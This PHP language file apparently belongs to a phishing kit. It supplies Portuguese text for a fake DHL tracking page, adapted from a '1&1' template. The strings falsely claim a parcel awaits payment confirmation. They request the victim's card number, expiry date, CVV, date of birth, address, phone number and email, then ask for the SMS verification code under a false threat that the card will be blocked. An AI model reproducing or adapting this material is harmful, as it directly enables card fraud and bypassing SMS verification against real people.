<?php
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+ Author Name      : ZÉROFAUTES
* |Z|É|R|O|F|A|U|T|E|S| Template Name    : 1&1
* +-+-+-+-+-+-+-+-+-+-+ Template Version : V.0.1
===========================================================================*/
function lang($phrase){
	static $lang = array(
		/* Main Page */
		'Title'  => '| Bem-vinda |', 										/* Title */
		'Fo9001'  => 'Clientes particulares', 								/* Loading Header */
		'Fo9002' => 'Clientes empresariais', 								/* Loading P 1 */
		'LdngP2' => 'Envie pacotes,', 									/* Loading P 2 */
		'LdngP3' => 'Receber pacotes', 									/* Loading P 3 */
		'LdngP4' => 'Ajuda & contato',  									/* Loading P 4 */
		'LdngP5'	 => 'DHL Rastreamento.',	  							/* DHL TRACKING */
		'CntP'	 => 'Aqui você encontrará informações sobre seus envios.',	  								/* Control Panel */
		'CusId'	 => 'Acompanhe as remessas de encomendas a qualquer momento, desde o envio até a entrega',
		'InpL1'	 => 'DHL Envio',										/* Label Input 1 */
		'CusPs'	 => 'tracking number 00340434139185930097 - ',		  									/* Customer Password */
		'InpL2'	 => 'Status: ',							/* Label Input 2 */
		'Rmmbr'	 => 'na entrega',										/* Remember Me */
		'Lbtn'	 => 'Mensagem importante!',											/* Login Btn */
		'Span1'	 => 'Para concluir a entrega o mais rápido possível, confirme o pagamento ',				/* Are you still ... */
		'Span2'	 => ', clicando em Avançar. A confirmação online deve ser feita nos próximos 14 dias, antes que expire.',
		'Ntke'	 => 'Próximo',									/* Btn next */
		'AsdH2'	 => 'DHL Pacote',											/* Service */
		'AsdS1'	 => 'DHL Serviços',										/* MailXchange */
		'AsdS2'	 => 'DHL Express',						/* Detailed help and contact */
		'AsdS3'	 => 'DHL Logística',										/* Online FAQs */
		'AsdS4'	 => 'Contato',										/* GoToAssist */
		'P1H1'	 => 'Ajuda e serviço ao cliente',								/* 1&1 MyWebsite*/
		'P1Pr'	 => 'Veja como funciona',											/* Here's how it works */
		'P2H1'	 => 'Aplicativos móveis',								/* Microsoft Office 365 */
		'P2Pr'	 => 'Sobre nós',					/* Paragraphe 2 Paragraphe */
		'P3H1'	 => 'Post DHL',									/* 1&1 Domains */
		'P3Pr'	 => 'Responsabilidade',											/* Paragraphe 3 Paragraphe */
		'PLink'	 => 'Presse',									/* More information */
		'FtrS1'	 => 'Carreira',							/* 1&1 Internet Ltd. • 2018 */
		'FtrS2'	 => ' DHL International GmbH - All rights reserved.',									/* Privacy Policy */
		'Sfokh'	 => 'Precisamos do seu endereço para garantir que pessoas não autorizadas não possam acessar seus pacotes, Você tem ',									/* We need your address to be sure */
		'Ayam'	 => '10 dias úteis',									/* 10 working days */
		'Froth'	 => 'Desde a chegada do seu pacote até a filial da DHL, depois desse tempo, o pacote será devolvido ao remetente.',									/* From the arrival of your package */
		'InptCC'	 => 'Nome do titular do cartão',									/* Cardholder's name */
		'InptCCN'	 => 'Número do Cartão de Crédito',									/* Credit card number */
		'ExpMmAa'	 => 'Exp MM/AA',									/* Expir */
		'NumCvC'	 => 'CVV (CVC)',									/* CVV */
		'AddInf'	 => 'Distrito',									/* Address */
		'CodPOs'	 => 'Código-Postal',									/* Zip */
		'MdiNa'	 => 'Cidade',									/* Zip */
		'Zdiyad'	 => 'Data de nascimento DD/MM/AAAA',									/* DOB */
		'Farnon'	 => 'Número de telefone',									/* Phone Number */
		'Barid'	 => 'Your E-mail',									/* Your Email */
		'PlzCon'	 => 'Por favor, confirme o seguinte pagamento.',									/* Please confirm the following */
		'Theun'	 => 'A senha exclusiva foi enviada para o número de celular listado abaixo. Se você precisar alterar seu número de celular, entre em contato com seu banco ou modifique-o através dos canais disponíveis (caixa eletrônico, web).',									/* Please confirm the following */
		'March'	 => 'Comerciante:',									/* Merchant */
		'ExpDh'	 => 'DHL EXPRESS',									/* DHL EXPRESS */
		'Ch7al'	 => 'Montante:',									/* Amount */
		'Tarikh'	 => 'Data:',									/* Date */
		'TlNum'	 => 'Seu número de telefone:',									/* Your Phone Number */
		'SmCos'	 => 'código SMS:',									/* Your SMS */
		'PlzSm'	 => 'Digite o código de verificação recebido por sms: ',				/* Please enter the */
		'Subnn'	 => 'Enviar',				/* Submit */
		'AllCp'	 => 'DHL International GmbH - All rights reserved.',				/* All Right */
		'SmEnv'	 => 'Código SMS enviado ...',				/* SMS code sent... */
		'SmWron'	 => 'O SMS está errado ou expirou! Após (3) erros na inserção do código recebido via SMS, a transação atual é cancelada e o cartão de crédito bloqueado.',				/* SMS is wrong */
		'LastSm'	 => 'Atenção! Digite o último SMS recebido',				/* SMS is wrong */
		'YouHav'	 => 'Você ativou o processo de entrega com sucesso. Você receberá um e-mail quando enviarmos o seu pacote.'				/* SMS is wrong */
		
		
		
		
	);	
	return $lang[$phrase];
}




//		 | ' | = &apos;




 ?>
 
 
 
 
 